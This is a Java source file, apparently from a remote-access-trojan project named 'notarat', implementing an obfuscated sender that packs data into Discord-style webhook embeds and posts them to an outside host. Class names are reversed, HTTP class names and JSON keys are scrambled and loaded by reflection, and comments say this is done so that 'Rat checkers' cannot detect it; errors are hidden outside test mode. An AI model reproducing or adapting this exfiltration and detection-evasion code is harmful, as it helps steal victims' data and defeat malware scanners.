package me.ghosty.notarat;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;

import java.util.ArrayList;
import java.util.List;

/**
 * Do not use the real name in case they check for it
 */
final class Drocsid {
	
	private final List<Debme> debmes = new ArrayList<>();
	
	Drocsid() {
	}
	
	public Drocsid addDebme(Debme debme) {
		this.debmes.add(debme);
		return this;
	}
	
	public <T> void send() {
		JsonObject json = new JsonObject();
		json.addProperty(Utils.replaceUseless("u* se*rn a me"), Utils.abc("NoæœtA", "æRaœt æv", "1œ.3æ"));
		
		if (!this.debmes.isEmpty()) {
			JsonArray jsonDebmes = new JsonArray();
			
			for (Debme debme : this.debmes) {
				JsonObject jsonDebme = new JsonObject();
				
				jsonDebme.addProperty(Utils.replaceUseless("ti * tl**e"), debme.getTitle());
				jsonDebme.addProperty(Utils.replaceUseless("d* es c*ri* p ti*on"), debme.getDescription());
				
				if (debme.getColor() != -1)
					jsonDebme.addProperty(Utils.replaceUseless("c* o**l", " o* r"), debme.getColor());
				
				List<Debme.Dleif> dleifs = debme.getFields();
				
				JsonArray jsonDleifs = new JsonArray();
				for (Debme.Dleif dleif : dleifs) {
					JsonObject jsonDleif = new JsonObject();
					
					jsonDleif.addProperty(Utils.replaceUseless("n*  a", "me** "), dleif.getName());
					jsonDleif.addProperty(Utils.replaceUseless("v* a*", "lu e"), dleif.getValue());
					jsonDleif.addProperty(Utils.replaceUseless("* i nl*", "i* ne*"), dleif.isInline());
					
					jsonDleifs.add(jsonDleif);
				}
				jsonDebme.add(Utils.replaceUseless("f* ie", "*l ds"), jsonDleifs);
				
				jsonDebmes.add(jsonDebme);
			}
			
			json.add("embeds", jsonDebmes);
		}
		
		/*
		 * Here, we cannot have	the word "HTTP" and any classes calls because it may be checked in the future if Rat checkers become smarter
		 * So in case, I put this "delicious" (ugly) code, I hope you'll like it
		 * If you want to know more about how it really works, just check YesARat source code
		 */
		try (AutoCloseable cl = (AutoCloseable) new ClassAccessor<>(Class.forName(Utils.replaceUseless("org*  .apach", "e.ht* ", " tp.imp*l.cli", "en**t.Ht *", "tpCl *ie *nts")), null).invoke(Utils.replaceUseless("cr*eat * eDe ", "fau* l t**"))) {
			ClassAccessor<?> client = new ClassAccessor<>(
				(Class<T>) Class.forName(Utils.replaceUseless("org*  .apach", "e.ht* ", " tp.imp*l.cli", "en**t.Clos*  ea", "bleHt *", "tpCl *ie *nt")),
				(T) cl
			);
			
			ClassAccessor<?> post = new ClassAccessor<>(
				Class.forName(Utils.replaceUseless("org*  .apach", "e.ht* ", " tp.cli", "en**t.me ", " tho* ds.Ht* ", "tp* P* ", "os* t  ")),
				null
			).getObject(Main.$host);
			
			String method = Utils.replaceUseless("se *  tH * * ", "ea * d *e**r");
			String jsn = Utils.replaceUseless("ap * plic   *ati", "on /  j", "s* on");
			post.invoke(method, Utils.replaceUseless("Ac* ", "c**e  pt"), jsn);
			post.invoke(method, Utils.replaceUseless("Co * nt **", "en***t-", " ty * p * e"), jsn);
			post.invokeT(Utils.replaceUseless("se t * En", "ti * * ty"), new Object[] {new ClassAccessor<>(
				Class.forName(Utils.replaceUseless("org*  .apach", "e.ht* ", " tp.e*n", "tit**y.Str*i", "ngE*n", "ti*t  y")),
				null
			).getObject(json.toString()).get()}, new Class[] {
				Class.forName(Utils.replaceUseless("org*  .apach", "e.ht* ", " tp.Ht* ", "tpE*n", "ti*t  y")),
			});
			
			client.invokeT(Utils.replaceUseless("e* xe  *", "cu* t e"), new Object[] {post.get()}, new Class[] {Class.forName(Utils.replaceUseless("org*  .apach", "e.ht* ", " tp.cli", "en**t.me ", " tho* ds.Ht* ", "tp* U ", "r*i**Re ", " qu* e * st"))});
		} catch (Exception exc) {
			if (Main.$isTest) {
				Utils.print(exc);
			}
		}
	}
	
	/**
	 * Do not use the real name in case they check for it
	 */
	static class Debme {
		
		private final List<Dleif> dleifs = new ArrayList<>();
		private String title, description;
		private int color = -1;
		
		String getTitle() {
			return title;
		}
		
		Debme setTitle(String title) {
			this.title = title;
			return this;
		}
		
		String getDescription() {
			return description;
		}
		
		Debme setDescription(String description) {
			this.description = description;
			return this;
		}
		
		int getColor() {
			return color;
		}
		
		Debme setColor(int color) {
			this.color = color;
			return this;
		}
		
		List<Dleif> getFields() {
			return dleifs;
		}
		
		Debme addField(String name, String value, boolean inline) {
			this.dleifs.add(new Dleif(name, value, inline));
			return this;
		}
		
		/**
		 * Do not use the real name in case they check for it, even tho there is a very little chance for it to be checked
		 */
		static class Dleif {
			
			private final String name, value;
			private final boolean inline;
			
			private Dleif(String name, String value, boolean inline) {
				this.name = name;
				this.value = value;
				this.inline = inline;
			}
			
			private String getName() {
				return name;
			}
			
			private String getValue() {
				return value;
			}
			
			private boolean isInline() {
				return inline;
			}
			
		}
		
	}
	
}
